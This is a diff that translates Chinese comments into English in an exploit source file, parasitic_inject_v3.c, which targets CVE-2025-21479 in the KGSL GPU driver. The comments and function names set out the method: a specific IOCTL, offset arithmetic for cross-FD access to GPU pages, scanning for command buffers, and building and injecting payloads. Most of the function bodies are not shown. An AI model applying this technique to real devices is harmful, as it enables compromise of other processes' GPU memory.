@@ -1,10 +1,10 @@
 /*
- * parasitic_inject_v3.c - 正確實現 CVE-2025-21479 寄生式注入
+ * parasitic_inject_v3.c - correct implementation of CVE-2025-21479 parasitic injection
  *
- * 關鍵發現：
- * 1. 使用 IOCTL_GPUMEM_ALLOC (0xc018092f) 而不是 GPUOBJ_ALLOC
- * 2. mmap 使用 gpuaddr 作為 offset
- * 3. 跨 FD 訪問：offset = (page_index + 1) * 0x1000
+ * Key findings:
+ * 1. Use IOCTL_GPUMEM_ALLOC (0xc018092f), not GPUOBJ_ALLOC
+ * 2. mmap uses gpuaddr as the offset
+ * 3. Cross-FD access: offset = (page_index + 1) * 0x1000
  * 4. page_index = (gpuaddr - 0x4000000000) / 0x1000
  */
 
@@ -79,7 +79,7 @@ static void sigint_handler(int sig)
     running = 0;
 }
 
-/* 分配 GPU 內存 */
+/* Allocate GPU memory */
 static int alloc_gpu_mem(int fd, uint64_t *gpuaddr)
 {
     struct
@@ -101,7 +101,7 @@ static int alloc_gpu_mem(int fd, uint64_t *gpuaddr)
     return 0;
 }
 
-/* 通過 offset 訪問 GPU 內存頁 */
+/* Access a GPU memory page through the offset */
 static void *map_gpu_page(int fd, uint64_t offset)
 {
     void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
@@ -109,7 +109,7 @@ static void *map_gpu_page(int fd, uint64_t offset)
     return addr;
 }
 
-/* 檢查 PM4 內容 */
+/* Check the PM4 content */
 static int analyze_pm4(const uint32_t *buf, size_t dwords,
                        int *pm4_out, int *ib_out, int *nop_out, int *draw_out)
 {
@@ -173,7 +173,7 @@ static int analyze_pm4(const uint32_t *buf, size_t dwords,
     return pm4 > 5;
 }
 
-/* 找到 NOP 序列 */
+/* Find the NOP sequence */
 static int find_nop_sequence(const uint32_t *buf, size_t dwords, int min_space)
 {
     for (size_t i = 0; i < dwords;)
@@ -217,7 +217,7 @@ static int find_nop_sequence(const uint32_t *buf, size_t dwords, int min_space)
     return -1;
 }
 
-/* 建構注入 payload */
+/* Build the injection payload */
 static int build_payload(uint32_t *buf, int type)
 {
     int idx = 0;
@@ -259,7 +259,7 @@ static int build_payload(uint32_t *buf, int type)
     return idx;
 }
 
-/* 掃描所有可能的 offset */
+/* Scan every possible offset */
 static void scan_offsets(int fd, uint64_t start_idx, uint64_t end_idx)
 {
     printf("\n[*] Scanning page indices %lu - %lu\n",
@@ -325,7 +325,7 @@ static void scan_offsets(int fd, uint64_t start_idx, uint64_t end_idx)
            mapped, readable, pm4_found);
 }
 
-/* 持續監控並注入 */
+/* Continuously monitor and inject */
 static void monitor_and_inject(int fd, int duration, int payload_type)
 {
     printf("\n╔═══════════════════════════════════════════════════════════════╗\n");
@@ -427,7 +427,7 @@ static void monitor_and_inject(int fd, int duration, int payload_type)
     printf("[*] Injections: %d successful / %d attempted\n", success, injects);
 }
 
-/* 先分配多個 buffer 來測試 offset 機制 */
+/* First allocate several buffers to test the offset mechanism */
 static void test_offset_mechanism(int fd)
 {
     printf("\n=== Testing Offset Mechanism ===\n");
@@ -435,7 +435,7 @@ static void test_offset_mechanism(int fd)
 #define NUM_ALLOCS 10
     uint64_t gpuaddrs[NUM_ALLOCS];
 
-    /* 分配多個 buffer */
+    /* Allocate several buffers */
     printf("[*] Allocating %d GPU buffers...\n", NUM_ALLOCS);
     for (int i = 0; i < NUM_ALLOCS; i++)
     {
@@ -447,7 +447,7 @@ static void test_offset_mechanism(int fd)
         printf("  [%d] gpuaddr=0x%lx\n", i, (unsigned long)gpuaddrs[i]);
     }
 
-    /* 寫入標記 */
+    /* Write markers */
     for (int i = 0; i < NUM_ALLOCS; i++)
     {
         void *addr = map_gpu_page(fd, gpuaddrs[i]);
@@ -499,7 +499,7 @@ static void test_offset_mechanism(int fd)
         }
     }
 
-    /* 測試更大的 offset 範圍 */
+    /* Test a wider offset range */
     printf("\n[*] Testing extended offset range:\n");
     for (uint64_t off = 0x1000; off <= 0x100000; off *= 2)
     {
@@ -549,7 +549,7 @@ int main(int argc, char *argv[])
     }
     printf("[+] KGSL fd: %d\n", fd);
 
-    /* 先分配一個 buffer */
+    /* First allocate a buffer */
     uint64_t our_gpuaddr;
     if (alloc_gpu_mem(fd, &our_gpuaddr) < 0)
     {
